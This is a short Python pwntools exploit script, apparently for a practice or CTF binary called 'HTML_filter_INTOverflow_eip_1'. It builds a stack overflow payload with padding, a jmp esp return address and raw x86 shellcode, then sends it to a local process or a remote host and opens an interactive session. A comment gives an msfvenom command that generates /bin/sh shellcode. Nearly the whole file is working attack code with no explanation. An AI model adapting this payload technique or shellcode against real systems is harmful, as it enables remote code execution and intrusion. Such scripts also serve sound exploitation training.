#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-23 20:25:39
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./HTML_filter_INTOverflow_eip_1"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x8048fcc\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def gen(eip):
	ru("\n")
	shellcode = p32(0x41424344)
	payload = "b"*(0xa+0x4)+eip
	payload +="b"*(0x100-len(payload))
	payload += shellcode
	sd(payload)
	import base64
	print base64.b64encode(payload)
shellcode = "\x31\xdb\xf7\xe3\x53h@\xa0\x0e\x08Y\xb2\x04\xb0\x03\xcd\x80"+p32(0)
jmp_esp = 0x080c0f7f
payload = '<'+'1'*0x70+p32(jmp_esp)+shellcode
payload+="a"*(0x95-len(payload))+p32(0x41424344)
import base64
print base64.b64encode(payload)
sd(payload)
p.interactive()
